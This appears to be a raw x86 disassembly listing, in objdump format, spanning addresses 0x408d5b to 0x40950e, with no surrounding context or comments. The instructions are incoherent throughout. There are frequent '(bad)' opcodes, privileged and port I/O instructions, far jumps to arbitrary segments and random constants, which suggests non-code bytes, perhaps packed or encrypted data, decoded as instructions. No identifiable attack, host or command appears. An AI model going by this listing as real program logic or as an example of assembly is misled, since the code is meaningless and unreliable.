  408d5b:	repz (bad) 
  408d5d:	fidivr DWORD PTR [edi-0x2f86539f]
  408d63:	cli    
  408d64:	sahf   
  408d65:	int3   
  408d66:	cli    
  408d67:	scas   al,BYTE PTR es:[edi]
  408d68:	retf   0xfff8
  408d6b:	outs   dx,BYTE PTR ds:[esi]
  408d6c:	jnp    0x408d1e
  408d6e:	adc    eax,0x84c99305
  408d73:	jns    0x408d0b
  408d75:	das    
  408d76:	and    DWORD PTR [ecx+0x5c67278b],esi
  408d7c:	mov    ebp,0x16884536
  408d81:	dec    ecx
  408d82:	loop   0x408d9c
  408d84:	inc    eax
  408d85:	stos   DWORD PTR es:[edi],eax
  408d86:	lods   eax,DWORD PTR ds:[esi]
  408d87:	call   0x7986a183
  408d8c:	mov    edx,ecx
  408d8e:	inc    esi
  408d8f:	mov    ebx,DWORD PTR [ebx-0x13]
  408d92:	cmp    DWORD PTR [ecx-0x12],ebx
  408d95:	popf   
  408d96:	cmp    eax,0xd1b9152b
  408d9b:	pop    ebx
  408d9c:	das    
  408d9d:	sbb    esp,eax
  408d9f:	mov    dh,0x61
  408da1:	repz mov ebp,eax
  408da4:	ja     0x408dfa
  408da6:	cs js  0x408d50
  408da9:	stos   BYTE PTR es:[edi],al
  408daa:	loope  0x408d74
  408dac:	fidiv  WORD PTR [eax+edx*1]
  408daf:	int    0x6b
  408db1:	les    edi,FWORD PTR [esi-0x80]
  408db4:	push   ebp
  408db5:	sti    
  408db6:	mov    ds:0xab3e42e3,al
  408dbb:	xor    DWORD PTR [esi-0x63],edi
  408dbe:	inc    ecx
  408dbf:	mov    al,0x78
  408dc1:	adc    eax,eax
  408dc3:	sbb    BYTE PTR [edx+0x171ba42],cl
  408dc9:	xor    ecx,ebx
  408dcb:	ins    BYTE PTR es:[edi],dx
  408dcc:	data16 fdivr QWORD PTR [eax-0x59ada380]
  408dd3:	or     esi,DWORD PTR [ebx]
  408dd5:	mov    al,ds:0xb005696
  408dda:	mov    ebx,0x8ba6857a
  408ddf:	dec    eax
  408de0:	mov    DWORD PTR [edx-0x53],esp
  408de3:	mov    ebx,0xbb12e375
  408de8:	aaa    
  408de9:	pop    esi
  408dea:	loope  0x408dc0
  408dec:	mov    DWORD PTR [ebp+0x6d8cb7aa],ecx
  408df2:	cld    
  408df3:	(bad)
  408df6:	dec    ebp
  408df7:	sbb    DWORD PTR [eax-0x6e],0xeddba124
  408dfe:	xor    cl,bh
  408e00:	xor    bl,BYTE PTR [esi-0x1ba40987]
  408e06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e07:	ret    
  408e08:	mov    ds:0xdb1f79ef,eax
  408e0d:	cmp    esp,DWORD PTR [edi+0x48460fe9]
  408e13:	cdq    
  408e14:	aam    0x66
  408e16:	pop    ds
  408e17:	add    ch,BYTE PTR [edx+0x69]
  408e1a:	retf   
  408e1b:	icebp  
  408e1c:	jmp    0x2255cebb
  408e21:	sbb    DWORD PTR [esi-0x61cffc7b],edx
  408e27:	or     ah,0xcd
  408e2a:	popf   
  408e2b:	push   eax
  408e2c:	mov    al,ds:0x5853be24
  408e31:	mov    ah,0xb5
  408e33:	out    0x54,al
  408e35:	jecxz  0x408e32
  408e37:	sti    
  408e38:	sti    
  408e39:	adc    al,0x45
  408e3b:	push   ecx
  408e3c:	pop    ds
  408e3d:	(bad)  
  408e3e:	in     al,0x9c
  408e40:	jg     0x408e39
  408e42:	xor    eax,0x9cfe100b
  408e47:	add    al,BYTE PTR [eax-0x6a]
  408e4a:	int    0x1f
  408e4c:	add    bh,BYTE PTR [esi]
  408e4e:	gs loope 0x408e80
  408e51:	pop    ebx
  408e52:	imul   edi,esi,0xffffff86
  408e55:	mov    ch,0x76
  408e57:	xor    ebp,DWORD PTR [eax]
  408e59:	jl     0x408e50
  408e5b:	xor    DWORD PTR [esi-0x6abffe86],esp
  408e61:	xchg   edi,eax
  408e62:	sbb    eax,0xae318018
  408e67:	aaa    
  408e68:	sub    ebx,esi
  408e6a:	and    BYTE PTR [ecx+ebp*4],0xdb
  408e6e:	ror    BYTE PTR [edx+0x29],1
  408e71:	div    dh
  408e73:	outs   dx,BYTE PTR ds:[esi]
  408e74:	jo     0x408ea6
  408e76:	push   ss
  408e77:	pop    eax
  408e78:	fwait
  408e79:	cli    
  408e7a:	jl     0x408eeb
  408e7c:	dec    ecx
  408e7d:	xchg   edx,eax
  408e7e:	dec    eax
  408e7f:	fisubr DWORD PTR [ecx+0x61c30263]
  408e85:	dec    edx
  408e86:	stos   DWORD PTR es:[edi],eax
  408e87:	xchg   ebp,eax
  408e88:	and    BYTE PTR [ebp-0x610768ba],dl
  408e8e:	aas    
  408e8f:	push   0x97bb2c39
  408e94:	bound  ebp,QWORD PTR [edi]
  408e96:	ds aam 0xf3
  408e99:	icebp  
  408e9a:	test   eax,0x812ed2b
  408e9f:	fcom   DWORD PTR ds:0xbbee69e7
  408ea5:	shl    DWORD PTR [ecx+0x4d],cl
  408ea8:	mov    al,ds:0xcb51e709
  408ead:	out    0xb4,eax
  408eaf:	push   es
  408eb0:	arpl   WORD PTR [esi+eax*8],sp
  408eb3:	mov    eax,0x672ca004
  408eb8:	cmp    DWORD PTR ds:0xab019bd8,esp
  408ebe:	xchg   esi,eax
  408ebf:	dec    eax
  408ec0:	pop    esp
  408ec1:	xchg   ebp,eax
  408ec2:	cli    
  408ec3:	pop    ebx
  408ec4:	sti    
  408ec5:	sbb    ebp,ebp
  408ec7:	fistp  QWORD PTR [ebx-0x50747c83]
  408ecd:	jg     0x408e5a
  408ecf:	xor    esp,DWORD PTR [edi]
  408ed1:	fimul  DWORD PTR [eax]
  408ed3:	inc    ecx
  408ed4:	adc    eax,0xe7bd8bee
  408ed9:	dec    ebp
  408eda:	addr16 pop edi
  408edc:	cmp    al,0xb3
  408ede:	dec    esi
  408edf:	ins    BYTE PTR es:[edi],dx
  408ee0:	push   edi
  408ee1:	sub    esp,DWORD PTR [ebp-0x1b850a18]
  408ee7:	jns    0x408eaa
  408ee9:	xlat   BYTE PTR ds:[ebx]
  408eea:	push   esp
  408eec:	jns    0x408f54
  408eee:	jns    0x408eba
  408ef0:	mov    ds:0xcec93f8f,eax
  408ef5:	test   eax,0x3c9f6cb3
  408efa:	dec    ebp
  408efb:	mov    ebx,0x7336c3d3
  408f00:	jle    0x408f59
  408f02:	pop    ecx
  408f03:	dec    ecx
  408f04:	xor    al,0xb6
  408f06:	mov    cl,0xa8
  408f08:	ds ja  0x408eb8
  408f0b:	add    eax,0xf5032fed
  408f10:	xlat   BYTE PTR ds:[ebx]
  408f11:	push   eax
  408f12:	sbb    BYTE PTR [eax+0x3d54b4e4],dl
  408f18:	retf   
  408f19:	scas   eax,DWORD PTR es:[edi]
  408f1a:	cmp    DWORD PTR [eax],ecx
  408f1c:	dec    eax
  408f1d:	or     BYTE PTR [ecx-0x3437efcc],dh
  408f23:	add    DWORD PTR [eax+0x7d],esi
  408f26:	mov    ecx,0xfc99df46
  408f2b:	fadd   DWORD PTR [ebx]
  408f2d:	shr    BYTE PTR [esi+esi*1-0x13],0x3
  408f32:	dec    edi
  408f33:	add    BYTE PTR [edi-0x3bf3827e],cl
  408f39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f3a:	(bad)  
  408f3b:	(bad)  
  408f3c:	jg     0x408f0f
  408f3e:	bound  esi,QWORD PTR [edi]
  408f40:	mov    edi,?
  408f42:	(bad)  
  408f43:	sbb    BYTE PTR [edi],bh
  408f45:	push   0x35b7283b
  408f4a:	push   ecx
  408f4b:	iret   
  408f4c:	iret   
  408f4d:	add    dl,BYTE PTR [eax]
  408f4f:	add    BYTE PTR [eax],cl
  408f51:	(bad)  
  408f52:	enter  0x2184,0x99
  408f56:	push   es
  408f57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f58:	mov    esp,0x892bd023
  408f5d:	push   edx
  408f5e:	mov    bl,ch
  408f60:	mov    ebp,0x400f763d
  408f65:	or     dl,BYTE PTR [ebp+0x31]
  408f68:	add    BYTE PTR [ecx+ecx*2-0x6e],0x44
  408f6d:	shr    bl,1
  408f6f:	mov    WORD PTR es:[esi+0x2906362d],es
  408f76:	jecxz  0x408f3b
  408f78:	cmp    BYTE PTR [ecx+0x725d836],0xdb
  408f7f:	push   ecx
  408f80:	leave  
  408f81:	add    cl,BYTE PTR ds:0xf6bcac05
  408f87:	inc    edi
  408f88:	adc    DWORD PTR [ebx+ecx*8-0x6f],esp
  408f8c:	lods   eax,DWORD PTR ds:[esi]
  408f8d:	mov    ch,0x3a
  408f8f:	ss push 0x74
  408f92:	hlt    
  408f93:	sub    eax,0x20000063
  408f98:	add    BYTE PTR [ecx+0x44],cl
  408f9b:	inc    ecx
  408f9c:	push   esp
  408f9d:	popf   
  408f9e:	dec    ebx
  408f9f:	add    BYTE PTR [eax-0x3c3ba676],dh
  408fa5:	xchg   esp,eax
  408fa6:	sub    eax,0xeb976f75
  408fab:	mov    ecx,0x72c86d4a
  408fb0:	shr    DWORD PTR [esi+ebp*1-0x68],0xcd
  408fb5:	sub    eax,0x9592ccb3
  408fba:	xchg   esi,eax
  408fbb:	scas   al,BYTE PTR es:[edi]
  408fbc:	jbe    0x408f4f
  408fbe:	add    dl,BYTE PTR [ebx]
  408fc0:	mov    bl,0x80
  408fc2:	clc    
  408fc3:	xchg   esi,eax
  408fc4:	bound  ebp,QWORD PTR [edx+eax*8+0x5d]
  408fc8:	pop    edx
  408fc9:	mov    BYTE PTR [ebp-0x66247afe],al
  408fcf:	iret   
  408fd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fd1:	mov    esp,0x3837caf1
  408fd6:	mov    ebp,0xa8a5209d
  408fdb:	sub    BYTE PTR [ecx-0x18],dh
  408fde:	std    
  408fdf:	out    dx,eax
  408fe0:	lds    eax,FWORD PTR [edi]
  408fe2:	adc    al,al
  408fe4:	and    BYTE PTR [eax],ch
  408fe6:	mov    edi,0xbf678631
  408feb:	stc    
  408fec:	add    bh,BYTE PTR [ebx-0x101c329d]
  408ff2:	sti    
  408ff3:	add    bl,bl
  408ff5:	cmp    esp,DWORD PTR [edi+0x38]
  408ff8:	jno    0x408fec
  408ffa:	sub    al,0xbd
  408ffc:	(bad)  
  408ffd:	rcl    BYTE PTR [edi+0x1625106d],1
  409003:	neg    DWORD PTR [edi-0xd]
  409006:	or     eax,esi
  409008:	neg    DWORD PTR [esi]
  40900a:	aas    
  40900b:	sbb    edx,DWORD PTR [ecx+0x12]
  40900e:	push   esp
  40900f:	xchg   esp,eax
  409010:	sbb    BYTE PTR ds:0x28a90122,dl
  409016:	jmp    0x10e6628f
  40901b:	pusha  
  40901c:	push   ebx
  40901d:	(bad)  [ebx+0x2f6258a2]
  409023:	inc    edx
  409024:	mov    BYTE PTR [edi+0x44befb80],dh
  40902a:	fmul   DWORD PTR [edi+0x66cc0025]
  409030:	rcl    DWORD PTR [ebx-0x40],cl
  409033:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409034:	sar    dh,0x9c
  409037:	mov    ch,0xf6
  409039:	pop    ss
  40903a:	mov    al,0xe6
  40903c:	xor    DWORD PTR [ebx+0x6d],ebp
  40903f:	retf   
  409040:	jp     0x408fe7
  409042:	mov    dh,0xa6
  409044:	dec    esi
  409045:	mov    cl,0x82
  409047:	jb     0x4090a4
  409049:	ins    BYTE PTR es:[edi],dx
  40904a:	aam    0xd3
  40904c:	mov    ebx,0xed0c3f5e
  409051:	jb     0x409026
  409053:	cmp    BYTE PTR [ebx-0x2e524adb],bh
  409059:	fs stc 
  40905b:	pushf  
  40905c:	fldcw  WORD PTR [esi+edi*4-0x18]
  409060:	jne    0x409052
  409062:	int3   
  409063:	pop    eax
  409064:	or     dl,dl
  409066:	and    al,0xe1
  409068:	jmp    0x90ad:0xbadc9bd5
  40906f:	dec    edx
  409070:	nop
  409071:	and    al,0x4e
  409073:	icebp  
  409074:	xchg   ebp,eax
  409075:	(bad)  
  409076:	ficom  WORD PTR [esi]
  409078:	adc    cl,0xa8
  40907b:	(bad)
  40907e:	mov    ebx,ebp
  409080:	mov    ebp,0x94b4a28c
  409085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409086:	mov    ebx,0xc7228583
  40908b:	fisttp WORD PTR [edi-0x15e6258e]
  409091:	retf   0x1419
  409094:	repnz or BYTE PTR [ebx],dh
  409097:	inc    eax
  409098:	mov    al,0x38
  40909a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40909b:	jbe    0x40906b
  40909d:	adc    eax,0x7dd77e8a
  4090a2:	(bad)  
  4090a3:	cdq    
  4090a4:	adc    al,0x95
  4090a6:	repnz mov ebx,0xd4eae32
  4090ac:	pop    edx
  4090ad:	inc    ebx
  4090ae:	xchg   esi,eax
  4090af:	dec    ebx
  4090b0:	es xor eax,ebx
  4090b3:	loope  0x409109
  4090b5:	xor    BYTE PTR [ebp+0xb8319fb],bl
  4090bb:	dec    ebx
  4090bc:	xchg   ecx,eax
  4090bd:	or     BYTE PTR [edi],dh
  4090bf:	add    ch,BYTE PTR [esi+0x16024981]
  4090c5:	sub    esp,DWORD PTR [edi+0x45635845]
  4090cb:	mov    ebp,0xbce4595c
  4090d0:	cmc    
  4090d1:	cli    
  4090d2:	or     ebp,esp
  4090d4:	mov    WORD PTR [edi*4+0x28a2975e],gs
  4090db:	push   esi
  4090dc:	xchg   ch,dh
  4090de:	push   esi
  4090df:	sub    BYTE PTR [ecx-0x33],cl
  4090e2:	xchg   esi,eax
  4090e3:	push   es
  4090e4:	addr16 pop edi
  4090e6:	idiv   ebx
  4090e8:	jge    0x40907e
  4090ea:	push   edx
  4090eb:	cmp    al,0xfb
  4090ed:	(bad)  
  4090ee:	out    0xb9,eax
  4090f0:	jb     0x409155
  4090f2:	retf   0x8f63
  4090f5:	inc    DWORD PTR [ebx+ebx*8]
  4090f8:	cmp    esp,DWORD PTR [edi-0x718ac627]
  4090fe:	outs   dx,BYTE PTR ds:[esi]
  4090ff:	outs   dx,DWORD PTR ds:[esi]
  409100:	mov    BYTE PTR [ebp-0x42e012fe],dh
  409106:	jb     0x409162
  409108:	push   edx
  409109:	test   DWORD PTR [ebx],0x78de82ac
  40910f:	jnp    0x4090dd
  409111:	add    dl,al
  409113:	int3   
  409114:	inc    eax
  409115:	inc    esi
  409116:	das    
  409117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409118:	das    
  409119:	das    
  40911a:	dec    ebx
  40911b:	call   0x88acae9
  409120:	mov    ah,0xa9
  409122:	daa    
  409123:	std    
  409124:	les    ebp,FWORD PTR [esi+eiz*4+0x22acb2c]
  40912b:	adc    BYTE PTR [edi],bh
  40912d:	pop    ss
  40912e:	lock fisubr DWORD PTR [edi-0x4]
  409132:	(bad)  
  409133:	outs   dx,DWORD PTR ds:[esi]
  409134:	fdiv   QWORD PTR [edi+0x7e41c061]
  40913a:	ins    BYTE PTR es:[edi],dx
  40913b:	add    BYTE PTR [eax+0x3a],ah
  40913e:	cmp    eax,0x34f8107c
  409143:	mov    BYTE PTR [edi+0x75fcc6b1],bl
  409149:	imul   ecx,ebp,0xffffffd9
  40914c:	mov    al,ds:0xf74504f0
  409151:	mov    dh,0x3d
  409153:	xor    BYTE PTR ds:0x59bce9e,0xad
  40915a:	(bad)  
  40915b:	pop    eax
  40915c:	mov    edi,fs
  40915e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40915f:	push   edx
  409160:	dec    edx
  409161:	push   esp
  409162:	xchg   edx,eax
  409163:	and    bh,BYTE PTR [edi+ebp*2-0x5e]
  409167:	retf   
  409168:	xchg   edx,eax
  409169:	cmp    al,0x9b
  40916b:	mov    ds:0x2c6302cb,eax
  409170:	pop    edx
  409171:	xchg   edi,eax
  409172:	cwde   
  409173:	loopne 0x409102
  409175:	or     eax,0xa7e0b82b
  40917a:	loopne 0x4091ac
  40917c:	xchg   BYTE PTR [ebx],bl
  40917e:	aaa    
  40917f:	outs   dx,BYTE PTR ds:[esi]
  409180:	xchg   ebx,eax
  409181:	xchg   edi,eax
  409182:	cmp    eax,0xa516a54
  409187:	lahf   
  409188:	push   es
  409189:	in     al,dx
  40918a:	pop    edx
  40918b:	nop
  40918c:	xchg   edx,eax
  40918d:	shr    BYTE PTR [ebp+0x2b],1
  409190:	ss push es
  409192:	sub    DWORD PTR [ebp-0x598b3db2],ebx
  409198:	sub    DWORD PTR [edi-0x59497e64],edx
  40919e:	pop    eax
  40919f:	dec    esi
  4091a0:	add    BYTE PTR [edi],0xde
  4091a3:	(bad)  
  4091a4:	adc    al,0xa2
  4091a6:	cmp    ch,BYTE PTR [esi]
  4091a8:	out    dx,al
  4091a9:	xchg   edx,eax
  4091aa:	push   esi
  4091ab:	cmc    
  4091ac:	fcom   st(5)
  4091ae:	ss mov edi,0x8abafda
  4091b4:	mov    ds,WORD PTR [esi+0x32]
  4091b7:	lods   al,BYTE PTR ds:[esi]
  4091b8:	loope  0x4091d6
  4091ba:	pop    esp
  4091bb:	bound  ebx,QWORD PTR [ebx]
  4091bd:	xchg   ecx,eax
  4091be:	jns    0x4091c0
  4091c0:	aad    0x71
  4091c2:	(bad)  
  4091c3:	fsubr  DWORD PTR [edx-0x3]
  4091c6:	mov    edi,0x80d9773c
  4091cb:	pop    ecx
  4091cc:	push   es
  4091cd:	jns    0x40923d
  4091cf:	sub    DWORD PTR [ebx+0x51],ecx
  4091d2:	dec    ebp
  4091d3:	ret    
  4091d4:	lea    ebx,[eax+0x26]
  4091d7:	cmp    dh,BYTE PTR [ebp+0xd69b45e]
  4091dd:	add    DWORD PTR [esi+0x6b],eax
  4091e0:	cs pop ebp
  4091e2:	js     0x4091fd
  4091e4:	cmp    eax,0x43cec2bf
  4091e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091ea:	cdq    
  4091eb:	iret   
  4091ec:	out    0x95,eax
  4091ee:	add    BYTE PTR [eiz*4-0x66436a78],0xf0
  4091f6:	ror    DWORD PTR [ebx+esi*4-0x13],cl
  4091fa:	cmc    
  4091fb:	jp     0x409271
  4091fd:	cmp    bl,BYTE PTR ds:0x979dfdbe
  409203:	js     0x4091fa
  409205:	int    0x1b
  409207:	cmp    al,0xf8
  409209:	call   0x402dce15
  40920e:	inc    ebx
  40920f:	scas   eax,DWORD PTR es:[edi]
  409210:	aas    
  409211:	add    al,0x21
  409213:	imul   esp,DWORD PTR [ecx+0x552f88c8],0x55
  40921a:	sbb    eax,0xecb20e4f
  40921f:	cwde   
  409220:	pop    edi
  409221:	push   esp
  409222:	sbb    eax,0x9868d5d6
  409227:	cmp    edx,DWORD PTR [eax-0x25]
  40922a:	js     0x40928e
  40922c:	push   ecx
  40922d:	mov    edx,DWORD PTR [edx]
  40922f:	cmp    DWORD PTR [edx+0x2b],ebx
  409232:	lods   al,BYTE PTR ds:[esi]
  409233:	pop    ecx
  409234:	int    0x0
  409236:	inc    edx
  409237:	add    al,0x20
  409239:	sahf   
  40923a:	or     ch,BYTE PTR [edx+edi*2]
  40923d:	sahf   
  40923e:	sti    
  40923f:	push   ds
  409240:	add    DWORD PTR [eax-0x67ff9ee1],eax
  409246:	dec    esp
  409247:	(bad)  
  409248:	ins    DWORD PTR es:[edi],dx
  409249:	loopne 0x409277
  40924b:	lock imul esp,eax,0x7f31ac17
  409252:	int    0xc2
  409254:	mov    al,0x8a
  409256:	mov    eax,ds:0xcabb0e46
  40925b:	add    edi,0x5457da82
  409261:	aas    
  409262:	push   0x5d
  409264:	push   edx
  409265:	dec    ecx
  409266:	xchg   esp,eax
  409267:	push   0x84e135b9
  40926c:	inc    eax
  40926d:	jmp    0x409201
  40926f:	xor    cl,bl
  409271:	sar    BYTE PTR [edx+0x5ee31b40],1
  409277:	or     al,0x6e
  409279:	pusha  
  40927a:	dec    ecx
  40927b:	xchg   esi,eax
  40927c:	xchg   edi,eax
  40927d:	pop    eax
  40927e:	xchg   esi,eax
  40927f:	out    0x1,eax
  409281:	inc    esp
  409282:	or     BYTE PTR [ecx+edx*8-0x748d41a4],cl
  409289:	shl    dh,cl
  40928b:	dec    ecx
  40928c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40928d:	dec    ebx
  40928e:	add    ecx,DWORD PTR [esi-0x6c]
  409291:	inc    esp
  409292:	jns    0x4092d1
  409294:	xchg   ebx,eax
  409295:	inc    edx
  409296:	nop
  409297:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409298:	xchg   edx,eax
  409299:	shl    DWORD PTR [eax],0x65
  40929c:	arpl   WORD PTR [ebx],sp
  40929e:	loope  0x409310
  4092a0:	push   edx
  4092a1:	nop
  4092a2:	pop    ss
  4092a3:	sbb    dh,BYTE PTR [ebx-0x2fa8152c]
  4092a9:	imul   dl
  4092ab:	imul   eax,DWORD PTR [ebx+0x71],0xffffff9b
  4092af:	(bad)  
  4092b0:	pop    edx
  4092b1:	xchg   esi,eax
  4092b2:	pop    ecx
  4092b3:	inc    eax
  4092b4:	dec    ebp
  4092b5:	add    dl,al
  4092b7:	rcl    BYTE PTR [edx+0x4f],0x5f
  4092bb:	adc    eax,0xe1a84189
  4092c0:	cmp    ecx,DWORD PTR [eax]
  4092c2:	pusha  
  4092c3:	and    eax,edx
  4092c5:	mov    ebp,0x6b009cb8
  4092ca:	add    eax,0xb59eb842
  4092cf:	sub    al,0xd
  4092d1:	jns    0x4092f4
  4092d3:	push   0x29
  4092d5:	shl    DWORD PTR [ecx+0x45],0x9e
  4092d9:	xor    BYTE PTR [ecx],ch
  4092db:	inc    esi
  4092dc:	inc    ebp
  4092dd:	dec    eax
  4092de:	jmp    0x9c2a:0x2db76b5f
  4092e5:	mov    cl,0xdc
  4092e7:	mov    eax,0xbf331e76
  4092ec:	int3   
  4092ed:	cdq    
  4092ee:	push   ebx
  4092ef:	fwait
  4092f0:	mov    ch,0x85
  4092f2:	xor    DWORD PTR [edx-0x1b],esp
  4092f5:	mov    cs,WORD PTR [ebp-0x80]
  4092f8:	push   ebp
  4092f9:	and    al,ah
  4092fb:	push   ds
  4092fc:	int    0xba
  4092fe:	aad    0x7c
  409300:	cli    
  409301:	jge    0x409361
  409303:	jge    0x4092f2
  409305:	or     eax,0xafdbecfe
  40930a:	jo     0x4092ee
  40930c:	int3   
  40930d:	jnp    0x409348
  40930f:	jno    0x4092fb
  409311:	sbb    al,0x5b
  409313:	(bad)  [edi+0x11360c18]
  409319:	pop    esi
  40931a:	stc    
  40931b:	sub    eax,0xba2ac6ee
  409320:	fild   QWORD PTR [eax+0x68fd1355]
  409326:	mov    esi,0xab2ab8b1
  40932b:	or     BYTE PTR [eax],al
  40932d:	adc    DWORD PTR [eax],ecx
  40932f:	push   esp
  409330:	retf   
  409331:	mov    al,ds:0xa0b4d219
  409336:	aad    0x6a
  409338:	cmp    edx,DWORD PTR [ebx+0x17f53a94]
  40933e:	adc    eax,0x4ca9ab8
  409343:	push   0x6efb9c30
  409348:	inc    ebx
  40934a:	(bad)  
  40934b:	adc    BYTE PTR [eax],al
  40934d:	sbb    al,0x4e
  40934f:	(bad)  
  409350:	and    eax,DWORD PTR [ecx]
  409352:	lahf   
  409353:	(bad)
  409356:	mov    dh,0xf0
  409358:	test   al,0xb5
  40935a:	test   BYTE PTR [ebx],0xd6
  40935d:	fadd   st,st(7)
  40935f:	lods   al,BYTE PTR ds:[esi]
  409360:	mov    ch,0xbd
  409362:	rcl    BYTE PTR [ebx-0x564297d1],1
  409368:	sub    DWORD PTR [esi-0x1b],edi
  40936b:	lds    ebp,FWORD PTR [edi-0xa931e36]
  409371:	and    al,0x41
  409373:	or     BYTE PTR ds:0xf1ac60d6,al
  409379:	icebp  
  40937a:	aad    0x12
  40937c:	imul   esi,DWORD PTR [edx+ebx*8],0x18
  409380:	out    0x8c,eax
  409382:	xor    DWORD PTR [esi],eax
  409384:	ins    DWORD PTR es:[edi],dx
  409385:	sub    al,0x79
  409387:	push   ecx
  409388:	inc    esi
  409389:	mov    ds:0x789e5cb3,eax
  40938e:	ss fwait
  409390:	xlat   BYTE PTR ds:[ebx]
  409391:	xlat   BYTE PTR ds:[ebx]
  409392:	outs   dx,DWORD PTR ds:[esi]
  409393:	ret    
  409394:	xor    eax,0xce4bad38
  409399:	mov    edi,0xfd68bb5
  40939e:	mov    ds:0x20a92414,al
  4093a3:	dec    ebp
  4093a4:	add    al,0x52
  4093a6:	push   es
  4093a7:	push   0xa
  4093a9:	imul   ebp,DWORD PTR [edx],0x6c5b0e19
  4093af:	(bad)  
  4093b0:	ficomp DWORD PTR [esp+ecx*4]
  4093b3:	or     esp,esi
  4093b5:	jae    0x4093fa
  4093b7:	pop    esi
  4093b8:	fadd   DWORD PTR [esi]
  4093ba:	das    
  4093bb:	outs   dx,BYTE PTR ds:[esi]
  4093bc:	call   0xd141:0x5ba57801
  4093c3:	imul   edx,DWORD PTR [esp+edi*2+0x55],0x33
  4093c8:	ins    BYTE PTR es:[edi],dx
  4093c9:	outs   dx,BYTE PTR ds:[esi]
  4093ca:	(bad)  
  4093cb:	aad    0x2d
  4093cd:	outs   dx,BYTE PTR ds:[esi]
  4093ce:	retf   0x92ab
  4093d1:	and    BYTE PTR [edx+0x6ebaae3],0xed
  4093d8:	or     eax,0xf27ac98e
  4093dd:	xchg   edx,eax
  4093de:	cmc    
  4093df:	add    eax,DWORD PTR [ebx+0x366599e6]
  4093e5:	jae    0x4093b8
  4093e7:	cmp    BYTE PTR [ecx+0x16],0xcc
  4093eb:	add    BYTE PTR [eax-0x5b],ch
  4093ee:	pop    esi
  4093ef:	inc    ecx
  4093f0:	arpl   WORD PTR [esi-0x6e2d1b24],bx
  4093f6:	lods   eax,DWORD PTR ds:[esi]
  4093f7:	lea    esi,[ebp-0x3d412114]
  4093fd:	in     eax,dx
  4093fe:	imul   ebx,edi,0xffffffe5
  409401:	icebp  
  409402:	inc    edi
  409403:	mov    dh,0xfd
  409405:	xchg   esp,eax
  409406:	pop    esi
  409407:	retf   
  409408:	imul   edi,DWORD PTR [esi-0x653985d5],0xd478205f
  409412:	shl    DWORD PTR [eiz*2-0x1e8de3c8],cl
  409419:	ret    0x9e45
  40941c:	jns    0x409414
  40941e:	inc    ebp
  40941f:	xchg   BYTE PTR [ebx],bh
  409421:	(bad)  
  409423:	out    0x81,al
  409425:	(bad)  
  409426:	fcomp  st(4)
  409428:	cmp    cl,cl
  40942a:	jo     0x4093e0
  40942c:	add    eax,DWORD PTR [edx+0x55]
  40942f:	sub    al,0x25
  409431:	fadd   QWORD PTR [eax+esi*1+0x1]
  409435:	loop   0x409412
  409437:	jne    0x409499
  409439:	push   edi
  40943a:	scas   eax,DWORD PTR es:[edi]
  40943b:	scas   al,BYTE PTR es:[edi]
  40943c:	nop
  40943d:	adc    al,0x14
  40943f:	sti    
  409440:	aaa    
  409441:	add    cl,BYTE PTR [eax+0x4]
  409444:	jmp    0x3f17:0xe85fad5f
  40944b:	xor    eax,0xa6a3a0a6
  409450:	mov    ah,0x5a
  409452:	cmp    edi,DWORD PTR [esi+0x3d]
  409455:	test   ebp,esp
  409457:	test   DWORD PTR [eax-0x7b],ecx
  40945a:	adc    BYTE PTR [ecx+ebx*2+0x56],ah
  40945e:	lea    ecx,[eax]
  409460:	ins    BYTE PTR es:[edi],dx
  409461:	enter  0xaade,0x8d
  409465:	out    dx,eax
  409466:	push   esp
  409467:	jle    0x409411
  409469:	add    BYTE PTR [eax+0x38],dh
  40946c:	fidivr WORD PTR [edi]
  40946e:	pop    es
  40946f:	cld    
  409470:	add    al,BYTE PTR [edx+0x3e63584f]
  409476:	arpl   WORD PTR [ebp+edi*2+0x68e846dc],bp
  40947d:	sbb    ebx,esi
  40947f:	ror    BYTE PTR [edx-0xf],cl
  409482:	add    ebx,esp
  409484:	out    0x5f,eax
  409486:	mov    dl,0xd6
  409488:	sub    eax,0x8102cfd
  40948d:	sub    DWORD PTR [ecx+0x49],edx
  409490:	or     ebp,DWORD PTR [ecx+0x36810224]
  409496:	call   0xf785:0x96519b22
  40949d:	or     eax,0xd0bc142c
  4094a2:	and    eax,0x6a525e45
  4094a7:	pop    ebp
  4094a8:	or     eax,edi
  4094aa:	adc    BYTE PTR [ebx+0x64],0x6b
  4094ae:	sub    eax,0xccb4c6f3
  4094b3:	push   ss
  4094b4:	aaa    
  4094b5:	or     BYTE PTR [eax+0x32],ch
  4094b8:	sbb    DWORD PTR [ebx-0xd],esi
  4094bb:	mov    cx,dx
  4094be:	sub    DWORD PTR [edx+0x5a],edx
  4094c1:	adc    ah,BYTE PTR ds:0xa2d44a90
  4094c7:	js     0x40950b
  4094c9:	inc    edx
  4094ca:	mov    bh,0x23
  4094cc:	popf   
  4094cd:	xor    esi,DWORD PTR [eax+0x283e329f]
  4094d3:	leave  
  4094d4:	or     edi,DWORD PTR [ebp-0x4faaacc8]
  4094da:	pop    ecx
  4094db:	sub    esi,DWORD PTR [esi-0x6bd1220f]
  4094e1:	outs   dx,DWORD PTR ds:[esi]
  4094e2:	or     DWORD PTR [edx+ebx*1],edx
  4094e5:	mov    bl,BYTE PTR [eax+edi*2]
  4094e8:	test   al,0x68
  4094ea:	add    BYTE PTR [ecx+esi*1+0x667d135e],cl
  4094f1:	fist   WORD PTR [edx-0x37c9cdbd]
  4094f7:	gs aam 0x25
  4094fa:	or     esp,DWORD PTR [edi-0x4c]
  4094fd:	pop    es
  4094fe:	arpl   ax,bx
  409500:	xchg   DWORD PTR [ebx+eax*2],eax
  409503:	dec    edi
  409504:	push   edi
  409505:	xchg   esi,eax
  409506:	xchg   BYTE PTR [eax+edx*1+0xce733cc],ch
  40950d:	pushf  
  40950e:	xchg   BYTE PTR [si-0x31b0],ch
